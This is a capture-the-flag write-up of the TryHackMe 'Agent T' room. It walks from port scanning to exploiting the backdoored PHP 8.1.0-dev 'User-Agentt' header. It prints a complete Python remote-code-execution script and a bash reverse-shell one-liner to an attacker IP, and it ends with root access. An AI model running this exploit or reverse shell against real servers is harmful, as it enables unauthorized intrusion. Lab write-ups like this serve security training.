---
layout: single
title: TryHackMe - Agent T
excerpt: Something seems a little off with the server. Agent T recently uncovered a website that, at first glance, appears completely innocent. However, upon closer inspection, the way the server responds raises suspicion and hints at hidden functionality beneath the surface. Strange behaviors and unusual patterns suggest that there may be more to this system than meets the eye. The challenge lies in peeling back these layers and interpretating signals. What appears ordinary may in fact be the gateway to something far more complex.
date: 2025-11-02
classes: wide
header:
  teaser: /assets/images/thm-agentt/logo.png
  teaser_home_page: true
categories:
  - TryHackMe
  - Easy
  - Linux
tags:
  - user-agent-rce
  - rshell-escape
---


# Introduction
-------------
This writeup documents the penetration testing of the [**Agent T**](https://tryhackme.com/room/agentt) machine from the [**TryHackMe**](https://tryhackme.com/) platform.

Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds... 

In this case we'll exploit a vulnerable PHP version.

<br>
# Information Gathering
------------------

Once we have discovered the IP of the machine we need to enumerate as much information as possible.

When we ping a machine that is in our local network, normally:
* TTL 64: Linux machine.
* TTL 128: Windows machine.
We can also use the [**whichSystem**](https://github.com/Akronox/WichSystem.py) script.

```java
❯ ping -c 1 10.10.55.237
PING 10.10.55.237 (10.10.55.237) 56(84) bytes of data.
64 bytes from 10.10.55.237: icmp_seq=1 ttl=63 time=56.0 ms

--- 10.10.55.237 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 56.012/56.012/56.012/0.000 ms
```

In this case, it seems to be a Linux machine. Let's do a port scan with nmap.

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.55.237 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 19:58 CET
Initiating SYN Stealth Scan at 19:58
Scanning 10.10.55.237 [65535 ports]
Discovered open port 80/tcp on 10.10.55.237
Completed SYN Stealth Scan at 19:59, 17.94s elapsed (65535 total ports)
Nmap scan report for 10.10.55.237
Host is up, received user-set (0.16s latency).
Scanned at 2025-11-02 19:58:55 CET for 17s
Not shown: 59872 closed tcp ports (reset), 5662 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.08 seconds
           Raw packets sent: 88131 (3.878MB) | Rcvd: 61551 (2.462MB)
```

There are 3 open ports. Let's perform a deeper scan with the parameter ``-sCV`` over those ports.

```java
❯ nmap -sCV -p80 10.10.55.237 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 19:59 CET
Nmap scan report for 10.10.55.237
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds
```

The intrussion is going to be from port 80.

```
❯ whatweb http://10.10.55.237
http://10.10.55.237 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.55.237], JQuery, PHP[8.1.0-dev], Script, Title[Admin Dashboard], X-Powered-By[PHP/8.1.0-dev], X-UA-Compatible[IE=edge]
```

![](/assets/images/thm-agentt/web.png)

We have an admin dashboard using a relatively new PHP version.

Something feels wrong with this site. Let's fuzz some directories and files.

```
❯ gobuster dir -u 10.10.55.237 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.55.237
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 0 / 1 (0.00%)
2025/11/02 20:09:54 the server returns a status code that matches the provided options for non existing urls. http://10.10.55.237/caf17539-9288-4b70-a20a-7f88e0536803 => 200 (Length: 42131). Please exclude the response length or the status code or set the wildcard option.. To continue please exclude the status code or the length
```

Look at the error. The server responds but it always responds with 200 OK... Trying the parameter ``--exclude-length 4213`` didn't work too since It doesn't detect any directories.

If we open Burp Suite and try to examinate the request or use some tools there we find nothing either.

<br>
# Vulnerability Assesment
----------

At this point we need to search for vulnerabilities related to the version of the services, in this case, we can try with PHP.

```java
❯ searchsploit PHP 8.1.0
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                                                           | php/webapps/49933.py
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

There's an exploit for this PHP version. 

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.

<br>
# Exploitation
-------

The following exploit uses the backdoor to provide a pseudo shell in the host.

```python
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```

```
❯ python3 rce.py
Enter the full host url:
http://10.10.55.237

Interactive shell is opened on http://10.10.55.237 
Can't acces tty; job crontol turned off.
$ whoami
root
```

<br>
# Post-Exploitation
--------

That was that. Simple, isn't it? We are root

```bash
$ pwd
/var/www/html

$ cd ..  

$ pwd
/var/www/html
```

But we are not in an interactive tty. It's a kind of **restricted shell**. Let's create a simple reverse shell.

```bash
bash -c "bash -i >& /dev/tcp/10.8.78.182/443 0>&1"
```

```
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.8.78.182] from (UNKNOWN) [10.10.55.237] 37804
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3f8655e43931:~# cd /
cd /
root@3f8655e43931:/# ls -la
ls -la
...
-rw-rw-r--   1 root root   38 Mar  5  2022 flag.txt
...
root@3f8655e43931:/# cat flag.txt
cat flag.txt
***REDACTED***
```





